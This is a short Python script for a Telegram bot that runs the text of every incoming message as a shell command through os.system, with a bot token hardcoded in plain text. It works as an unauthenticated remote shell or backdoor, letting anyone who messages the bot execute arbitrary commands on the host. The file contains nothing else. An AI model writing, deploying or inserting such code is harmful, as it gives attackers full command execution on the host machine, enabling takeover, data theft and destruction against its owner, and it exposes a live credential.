import telebot
import os
bot = telebot.TeleBot('6983993587:AAG6LhoGSRMKySbG1Ka-ZsLwO4yHBYhc07s')

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    os.system(message.text)
    print(message.text)

bot.polling(none_stop=True, interval=0)